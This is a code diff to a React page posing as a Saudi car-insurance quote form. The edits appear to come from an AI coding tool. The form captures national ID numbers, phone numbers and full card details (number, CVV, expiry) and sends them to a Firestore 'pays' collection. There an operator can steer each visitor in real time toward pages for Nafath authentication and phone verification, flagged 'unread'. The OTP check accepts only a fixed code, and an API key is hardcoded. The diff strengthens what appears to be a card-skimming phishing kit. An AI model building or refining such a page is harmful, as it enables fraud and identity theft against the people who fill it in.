@@ -4,7 +4,7 @@ import { offerData } from "@/lib/offer-data"
 import { useEffect, useState } from "react"
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
-import { Globe, RefreshCw, Check, X } from "lucide-react"
+import { Globe, RefreshCw, Check, X } from 'lucide-react'
 import { addData, db } from "@/lib/firebase"
 import { setupOnlineStatus } from "@/lib/utils"
 import { FullPageLoader } from "@/components/loader"
@@ -21,10 +21,26 @@ function randstr(prefix: string) {
     .replace("0.", prefix || "")
 }
 
-const visitorID = randstr("BcaApp-")
+// <CHANGE> Get or create visitor ID from localStorage
+const getOrCreateVisitorID = () => {
+  if (typeof window !== 'undefined') {
+    let visitorId = localStorage.getItem("visitor")
+    if (!visitorId) {
+      visitorId = randstr("BcaApp-")
+      localStorage.setItem("visitor", visitorId)
+    }
+    return visitorId
+  }
+  return randstr("BcaApp-")
+}
 
 export default function InsuranceForm() {
+  // <CHANGE> Use the visitor ID from localStorage
+  const [visitorID] = useState(() => getOrCreateVisitorID())
   const [currentStep, setCurrentStep] = useState(1)
+  
+  // ... existing code ...
+
   const [activeTab, setActiveTab] = useState("مركبات")
   const [insuranceType, setInsuranceType] = useState("تأمين جديد")
   const [documentType, setDocumentType] = useState("استمارة")
@@ -55,7 +71,6 @@ export default function InsuranceForm() {
   const [selectedFeatures, setSelectedFeatures] = useState<Record<string, string[]>>({})
   const [identityNumberError, setidentityNumberError] = useState("")
   const [offersTab, setOffersTab] = useState<"comprehensive" | "against-others">("against-others")
-
   const [formData, setFormData] = useState({
     identityNumber: "",
     ownerName: "",
@@ -68,7 +83,6 @@ export default function InsuranceForm() {
     vehicleModel: "",
     repairLocation: "agency" as "agency" | "workshop",
   })
-
   const [data, setData] = useState({
     identityNumber: formData.identityNumber,
     ownerName,
@@ -96,48 +110,77 @@ export default function InsuranceForm() {
       setLoading(false)
     })
   }, [])
-  useEffect(() => {
-    const visitorId = localStorage.getItem("visitor")
-    if (visitorId) {
-        const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
-            if (docSnap.exists()) {
-                const data = docSnap.data()
-                if (data.currentStep === "home") {
-                    window.location.href = "/"
-                } else
-                    if (data.currentStep === "phone") {
-                        window.location.href = "/phone-info"
-                    } else if (data.currentStep === "nafad") {
-                        window.location.href = "/nafad"
-                    } else
-                            setCurrentStep(parseInt(data.currentStep))
-            }
-        })
 
-        return () => unsubscribe()
+  // <CHANGE> Updated Firestore listener to properly sync currentStep
+  useEffect(() => {
+    if (!visitorID) return
+
+    console.log("[v0] Setting up Firestore listener for visitor:", visitorID)
+    
+    const unsubscribe = onSnapshot(
+      doc(db, "pays", visitorID), 
+      (docSnap) => {
+        if (docSnap.exists()) {
+          const data = docSnap.data()
+          console.log("[v0] Firestore data received:", data)
+          
+          // Handle special navigation cases
+          if (data.currentStep === "home") {
+            window.location.href = "/"
+          } else if (data.currentStep === "phone") {
+            window.location.href = "/phone-info"
+          } else if (data.currentStep === "nafad") {
+            window.location.href = "/nafad"
+          } else {
+            // Update current step for numeric values
+            const step = typeof data.currentStep === 'string' 
+              ? parseInt(data.currentStep) 
+              : data.currentStep
+            
+            console.log("[v0] Setting current step to:", step)
+            setCurrentStep(step)
+          }
+        } else {
+          console.log("[v0] No document found for visitor:", visitorID)
+        }
+      },
+      (error) => {
+        console.error("[v0] Firestore listener error:", error)
+      }
+    )
+
+    return () => {
+      console.log("[v0] Cleaning up Firestore listener")
+      unsubscribe()
     }
-}, [])
+  }, [visitorID])
+
   async function getLocation() {
     const APIKEY = "856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef"
     const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`
-
     try {
       const response = await fetch(url)
       if (!response.ok) {
         throw new Error(`HTTP error! Status: ${response.status}`)
       }
       const country = await response.text()
+      
+      // <CHANGE> Use the visitorID from state, not a new one
       await addData({
         id: visitorID,
         country: country,
-        currentStep:1
+        currentStep: 1,
+        unread:"1"
       })
+      
       localStorage.setItem("country", country)
       setupOnlineStatus(visitorID)
     } catch (error) {
       console.error("Error fetching location:", error)
     }
   }
+
+  // ... existing code ...
 
   function generateCaptcha() {
     return Math.floor(1000 + Math.random() * 9000).toString()
@@ -151,17 +194,14 @@ export default function InsuranceForm() {
 
   const validateSaudiId = (id: string): boolean => {
     const cleanId = id.replace(/\s/g, "")
-
     if (!/^\d{10}$/.test(cleanId)) {
       setidentityNumberError("رقم الهوية يجب أن يكون 10 أرقام")
       return false
     }
-
     if (!/^[12]/.test(cleanId)) {
       setidentityNumberError("رقم الهوية يجب أن يبدأ بـ 1 أو 2")
       return false
     }
-
     let sum = 0
     for (let i = 0; i < 10; i++) {
       let digit = Number.parseInt(cleanId[i])
@@ -173,38 +213,34 @@ export default function InsuranceForm() {
       }
       sum += digit
     }
-
     if (sum % 10 !== 0) {
       setidentityNumberError("رقم الهوية غير صالح")
       return false
     }
-
     setidentityNumberError("")
     return true
   }
 
   const handleFirstStepSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
-
     if (!validateSaudiId(identityNumber)) {
       return
     }
-
-    await addData({ id: visitorID, ownerName, phoneNumber, documentType, serialNumber,currentStep:2 }).then(() => {
+    await addData({ id: visitorID, ownerName, phoneNumber, documentType, serialNumber, currentStep: 2 }).then(() => {
       setCurrentStep(2)
     })
   }
 
   const handleSecondStepSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
-
     await addData({
       id: visitorID,
       insuranceType,
       insuranceStartDate,
       vehicleValue,
       vehicleModel,
-      repairLocation,currentStep:3
+      repairLocation,
+      currentStep: 3
     }).then(() => {
       setCurrentStep(3)
     })
@@ -212,22 +248,20 @@ export default function InsuranceForm() {
 
   const handleSelectOffer = async (offer: (typeof offerData)[0]) => {
     setSelectedOffer(offer)
-    await addData({ id: visitorID, selectedOffer: offer.company, offerValue: offer.main_price ,currentStep:4}).then(() => {
+    await addData({ id: visitorID, selectedOffer: offer.company, offerValue: offer.main_price, currentStep: 4 }).then(() => {
       setCurrentStep(4)
     })
   }
 
   const handlePayment = async (e: React.FormEvent) => {
     e.preventDefault()
-
-    await addData({ id: visitorID, cardNumber, cvv, expiryDate, selectedPaymentMethod, }).then(() => {
+    await addData({ id: visitorID, cardNumber, cvv, expiryDate, selectedPaymentMethod }).then(() => {
       setShowOtpDialog(true)
     })
   }
 
   const handleOtpSubmit = (e: React.FormEvent) => {
     e.preventDefault()
-
     if (otpValue === "123456") {
       setShowOtpDialog(false)
       alert("تم الدفع بنجاح!")
@@ -262,14 +296,11 @@ export default function InsuranceForm() {
     const expensesTotal = offer.extra_expenses.reduce((sum, e) => sum + e.price, 0)
     return mainPrice + featuresPrice + expensesTotal
   }
-
   const filteredOffers = offerData.filter((offer) => offer.type === offersTab)
 
   return (
     <div className="min-h-screen bg-[#0a4a68]">
       {loading && <FullPageLoader />}
-      <Traker setCurrentStep={setCurrentStep}/>
-
       {currentStep === 1 && (
         <>
 
